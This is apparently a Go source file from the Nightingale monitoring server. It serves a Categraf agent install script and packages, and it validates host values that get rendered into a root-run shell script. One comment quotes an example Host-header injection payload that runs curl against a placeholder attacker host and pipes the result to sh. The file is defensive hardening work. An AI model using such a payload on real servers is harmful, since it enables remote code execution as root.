package router

import (
	"bytes"
	"encoding/json"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"text/template"

	"github.com/ccfos/nightingale/v6/center/router/agentassets"
	"github.com/ccfos/nightingale/v6/memsto"
	"github.com/ccfos/nightingale/v6/models"
	"github.com/ccfos/nightingale/v6/pkg/ginx"

	"github.com/gin-gonic/gin"
	"github.com/toolkits/pkg/logger"
	"github.com/toolkits/pkg/runner"
)

// categrafGitHubBase is where install.sh falls back to when this server has no
// bundled package (older release, or agents/ stripped from the deployment).
// GitHub is the only mirror used: it is where scripts/download_categraf.sh
// takes the pinned version from, so it is guaranteed to have that exact
// release. The flashcat CDN lags behind (it was still on v0.5.9 when v0.5.15
// was current), which would turn the fallback into a 404.
const categrafGitHubBase = "https://github.com/flashcatcloud/categraf/releases/download"

// categrafPkgs is both the arch allowlist and the arch -> filename mapping. The
// request string never reaches the filesystem: only these constant values do,
// which makes path traversal impossible by construction rather than by
// inspection (cf. builtinIcon, which concatenates unvalidated path params).
var categrafPkgs = map[string]string{
	"amd64": "categraf-linux-amd64.tar.gz",
	"arm64": "categraf-linux-arm64.tar.gz",
}

// installCategrafTpl is text/template on purpose. html/template would escape
// '&' and quotes and silently corrupt the shell script it renders.
var installCategrafTpl = template.Must(template.New("install-categraf").Parse(agentassets.InstallCategrafTpl))

// hostPattern is deliberately far narrower than what net/http accepts. Go's
// httpguts.ValidHostHeader permits the RFC 3986 sub-delims — including the
// single quote — so a request carrying
//
//	Host: evil.com';curl http://attacker/x|sh;'
//
// passes Go's own check and reaches this handler intact. Since the value is
// rendered into a root-executed shell script, it must be constrained to
// characters that cannot terminate a single-quoted literal or mean anything to
// a shell: letters, digits, dot, dash, optional :port. Nothing else.
var hostPattern = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9.\-]{0,252}(:[0-9]{1,5})?$`)

// hostV6Pattern accepts a bracketed IPv6 literal such as [::1] or [fe80::1]:17000.
// The RFC 6874 zone-id syntax ("%25eth0") is intentionally not accepted.
var hostV6Pattern = regexp.MustCompile(`^\[[0-9A-Fa-f:.]{2,45}\](:[0-9]{1,5})?$`)

// pathPattern allows an optional reverse-proxy sub-path such as /n9e.
var pathPattern = regexp.MustCompile(`^(/[A-Za-z0-9._\-]+)*$`)

func validAgentHost(h string) bool {
	if h == "" || len(h) > 263 {
		return false
	}
	if strings.HasPrefix(h, "[") {
		return hostV6Pattern.MatchString(h)
	}
	return hostPattern.MatchString(h)
}

// normalizeBaseURL parses s (scheme optional), keeps scheme+host+path, drops
// query/fragment/userinfo, and re-validates every retained component. The
// returned string is guaranteed to be a subset of [A-Za-z0-9.:/\[\]_-]: no
// quote, no whitespace, no CR/LF, no shell metacharacter. That guarantee is
// what makes it safe to paste verbatim inside '...' in the install script, and
// what lets the script's sed use '#' as a delimiter without escaping.
func normalizeBaseURL(s string) (string, bool) {
	s = strings.TrimSpace(s)
	if s == "" {
		return "", false
	}
	if !strings.Contains(s, "://") {
		s = "http://" + s
	}
	u, err := url.Parse(s)
	if err != nil || u.User != nil || u.Opaque != "" {
		return "", false
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return "", false
	}
	if !validAgentHost(u.Host) {
		return "", false
	}
	p := strings.TrimSuffix(u.Path, "/")
	if !pathPattern.MatchString(p) {
		return "", false
	}
	return u.Scheme + "://" + u.Host + p, true
}

// agentsDir resolves Center.AgentsDir against the working directory. The empty
// check is belt-and-braces: PreCheck normally fills it, but Routers built
// directly in tests skip PreCheck.
func (rt *Router) agentsDir() string {
	dir := rt.Center.AgentsDir
	if dir == "" {
		dir = "agents/categraf"
	}
	if !filepath.IsAbs(dir) {
		dir = filepath.Join(runner.Cwd, dir)
	}
	return dir
}

// bundledCategrafArches reports which architectures are actually staged on
// disk, by stat-ing the two constant filenames (never by globbing).
func (rt *Router) bundledCategrafArches() []string {
	dir := rt.agentsDir()
	arches := make([]string, 0, len(categrafPkgs))
	for _, arch := range []string{"amd64", "arm64"} {
		if st, err := os.Stat(filepath.Join(dir, categrafPkgs[arch])); err == nil && !st.IsDir() {
			arches = append(arches, arch)
		}
	}
	return arches
}

func (rt *Router) siteURL() string {
	if rt.Ctx == nil {
		return ""
	}
	str, err := models.ConfigsGet(rt.Ctx, "site_info")
	if err != nil || str == "" {
		return ""
	}
	var si memsto.SiteInfo
	if json.Unmarshal([]byte(str), &si) != nil {
		return ""
	}
	return si.SiteUrl
}

// n9eSelfURL derives the address this server was actually reached at, from the
// request alone. The ?host= override deliberately has no influence here: this
// is the value install.sh downloads the package from, and the package is run as
// root. Letting a URL parameter redirect that download would turn a link on a
// trusted n9e host into root-level remote code execution.
//
// Order: X-Forwarded-* -> Host -> site_url.
//
// Honouring X-Forwarded-* is not a weakening: those headers are exactly as
// attacker-controlled as Host, and all candidates go through the same
// allowlist, so the worst an attacker achieves is a syntactically valid
// hostname of their choosing — already achievable via Host alone. The scheme is
// clamped to the two literals, so it can inject nothing. A candidate that fails
// validation is dropped and we fall through; we never partially sanitise.
func (rt *Router) n9eSelfURL(c *gin.Context) string {
	scheme := "http"
	switch strings.ToLower(strings.TrimSpace(c.GetHeader("X-Forwarded-Proto"))) {
	case "https":
		scheme = "https"
	case "http":
	default:
		if c.Request.TLS != nil {
			scheme = "https"
		}
	}

	host := strings.TrimSpace(c.GetHeader("X-Forwarded-Host"))
	if i := strings.IndexByte(host, ','); i >= 0 { // XFH may be a chained list
		host = strings.TrimSpace(host[:i])
	}
	if !validAgentHost(host) {
		host = c.Request.Host
	}
	if validAgentHost(host) {
		return scheme + "://" + host
	}

	if u, ok := normalizeBaseURL(rt.siteURL()); ok {
		return u
	}
	return "" // the script then demands an explicit --server
}

// n9eBaseURL is the address the target machine should report to: the ?host= UI
// override when given, otherwise the address we were reached at.
//
// An override that fails validation is an error rather than a silent fallback:
// falling through would bake a *different* address into the script than the one
// the user typed, and categraf starts happily while reporting nowhere — the
// machine simply never shows up, with nothing pointing at the cause.
func (rt *Router) n9eBaseURL(c *gin.Context) string {
	if v := c.Query("host"); v != "" {
		u, ok := normalizeBaseURL(v)
		if !ok {
			ginx.Bomb(http.StatusBadRequest, "invalid host: %s", v)
		}
		return u
	}
	return rt.n9eSelfURL(c)
}

// normalizeStorageURL 把一个地址归一成可比较的 scheme://host:port/path 形式：
// scheme 与主机名转小写、补出默认端口、loopback 的几种写法收敛到一个、去掉尾斜杠。
// 空串表示无法解析，调用方一律当"匹配不上"处理。
func normalizeStorageURL(raw string) string {
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || u.Host == "" {
		return ""
	}

	scheme := strings.ToLower(u.Scheme)
	if scheme != "http" && scheme != "https" {
		return ""
	}

	host := strings.ToLower(u.Hostname())
	// 同一台机器的三种写法，配置里混用很常见，不收敛就永远匹配不上
	if host == "localhost" || host == "::1" {
		host = "127.0.0.1"
	}

	port := u.Port()
	if port == "" {
		if scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	return scheme + "://" + net.JoinHostPort(host, port) + strings.TrimRight(u.Path, "/")
}

// storageURLMatches 判断 writer 地址是否指向该数据源。用前缀而非相等：writer 配的是
// remote-write 端点（.../api/v1/write），数据源存的是查询根地址，前者天然是后者多一段
// 路径。要求前缀后紧跟 '/'，否则 http://x:9090 会错配到 http://x:90901。
func storageURLMatches(writerURL, datasourceURL string) bool {
	if writerURL == "" || datasourceURL == "" {
		return false
	}
	return writerURL == datasourceURL || strings.HasPrefix(writerURL, datasourceURL+"/")
}

// metricDatasourceIDs answers "where do host metrics actually land" by matching
// the pushgw writer addresses against the configured Prometheus datasources.
// The write path is the direct answer, unlike the engine_name/cluster_name
// chain the UI used to reason from — that one describes which alert engine
// consumes a datasource, which is a different thing and can disagree.
//
// URL matching is inherently lossy though: a VictoriaMetrics cluster writes to
// vminsert and reads from vmselect (different host and port), and a containerized
// deployment routinely writes to an internal address while the datasource is
// configured with an external one. So this is a best guess, never the whole
// truth — the wizard shows the datasource picker seeded with this value and
// lets the user switch, which is what keeps a miss from being a dead end.
func (rt *Router) metricDatasourceIDs() []int64 {
	if rt.DatasourceCache == nil || len(rt.Pushgw.Writers) == 0 {
		return nil
	}

	writerURLs := make([]string, 0, len(rt.Pushgw.Writers))
	for _, w := range rt.Pushgw.Writers {
		if u := normalizeStorageURL(w.Url); u != "" {
			writerURLs = append(writerURLs, u)
		}
	}
	if len(writerURLs) == 0 {
		return nil
	}

	ids := make([]int64, 0, 1)
	for _, ds := range rt.DatasourceCache.GetByCate(models.PROMETHEUS) {
		candidates := append([]string{ds.HTTPJson.Url}, ds.HTTPJson.Urls...)
		if matchesAnyWriter(writerURLs, candidates) {
			ids = append(ids, ds.Id)
		}
	}

	// GetByCate 走的是 map 迭代，顺序随机；前端拿第一个当默认值，不排序会让
	// 同一套配置每次请求返回不同的默认数据源。
	sort.Slice(ids, func(i, j int) bool { return ids[i] < ids[j] })
	return ids
}

func matchesAnyWriter(writerURLs, datasourceURLs []string) bool {
	for _, raw := range datasourceURLs {
		target := normalizeStorageURL(raw)
		if target == "" {
			continue
		}
		for _, w := range writerURLs {
			if storageURLMatches(w, target) {
				return true
			}
		}
	}
	return false
}

// categrafMeta tells the UI whether one-click install is available here, so an
// older or stripped-down deployment degrades to the docs instead of showing a
// dead button.
func (rt *Router) categrafMeta(c *gin.Context) {
	arches := rt.bundledCategrafArches()
	base := rt.n9eBaseURL(c)

	ginx.NewRender(c).Data(gin.H{
		"bundled":    len(arches) > 0,
		"version":    agentassets.CategrafVersion(),
		"arches":     arches,
		"basic_auth": len(rt.HTTP.APIForAgent.BasicAuth) > 0, // bool only, never the credentials
		"base_url":   base,
		"script_url": base + "/api/n9e/agents/categraf/install.sh",
		// The UI shows its collect-config wizard only when this is present, so
		// pointing the frontend at an older server degrades to the docs
		// instead of generating a command the server cannot serve.
		"collect": true,
		// Best-guess default for the wizard's "did the metrics arrive" check.
		// Empty is a valid answer (no writers configured, or none matched a
		// datasource): the UI then falls back to the default datasource and
		// the user picks from there.
		"metric_datasource_ids": rt.metricDatasourceIDs(),
	}, nil)
}

// categrafCollectScript serves the static collect-config applier. The same
// buffer-then-send discipline as the install script applies: the client pipes
// this into `sudo bash`, so a truncated body must be a curl error, never a
// half-executed script.
func (rt *Router) categrafCollectScript(c *gin.Context) {
	body := []byte(agentassets.CollectConfigScript)
	c.Header("X-Content-Type-Options", "nosniff")
	c.Header("Cache-Control", "no-store, no-cache, must-revalidate")
	c.Header("Content-Length", strconv.Itoa(len(body)))
	c.Data(http.StatusOK, "text/x-shellscript; charset=utf-8", body)
}

// categrafDownload serves a bundled collector package.
func (rt *Router) categrafDownload(c *gin.Context) {
	arch := ginx.QueryStr(c, "arch", "amd64")
	name, ok := categrafPkgs[arch]
	if !ok {
		ginx.Bomb(http.StatusBadRequest, "unsupported arch: %s", arch)
	}

	fp := filepath.Join(rt.agentsDir(), name)
	st, err := os.Stat(fp)
	if err != nil || st.IsDir() {
		// The 404 is load-bearing: install.sh reads it as "not bundled here"
		// and falls back to GitHub. Do not turn this into a 500.
		ginx.Bomb(http.StatusNotFound, "categraf package for %s is not bundled", arch)
	}

	c.Header("Content-Type", "application/gzip")
	c.FileAttachment(fp, name)
}

// categrafInstallScript renders the install script with this deployment's
// address baked in, which is what removes the "edit config.toml by hand" step.
func (rt *Router) categrafInstallScript(c *gin.Context) {
	// Rendered into a buffer, never streamed into c.Writer: the client pipes
	// this into `sudo bash`, which executes what it has already read. A render
	// that dies half way would leave the target with categraf unpacked but its
	// address never rewritten — installed, running, reporting nowhere.
	var buf bytes.Buffer
	err := installCategrafTpl.Execute(&buf, map[string]string{
		"BaseURL":      rt.n9eBaseURL(c),
		"DownloadBase": rt.n9eSelfURL(c),
		"Version":      agentassets.CategrafVersion(),
		"Arches":       strings.Join(rt.bundledCategrafArches(), ","),
		"GitHubBase":   categrafGitHubBase,
	})
	if err != nil {
		logger.Errorf("failed to render categraf install script: %v", err)
		ginx.Bomb(http.StatusInternalServerError, "failed to render install script")
	}

	c.Header("X-Content-Type-Options", "nosniff")
	// The body varies per request Host. Without these a shared proxy could
	// serve one client's rendered address — or a poisoned one — to everybody,
	// and the script runs as root.
	c.Header("Cache-Control", "no-store, no-cache, must-revalidate")
	c.Header("Vary", "Host, X-Forwarded-Host, X-Forwarded-Proto")
	// Explicit, so a connection cut mid-transfer is a curl error rather than a
	// script bash silently accepts as complete.
	c.Header("Content-Length", strconv.Itoa(buf.Len()))
	c.Data(http.StatusOK, "text/x-shellscript; charset=utf-8", buf.Bytes())
}
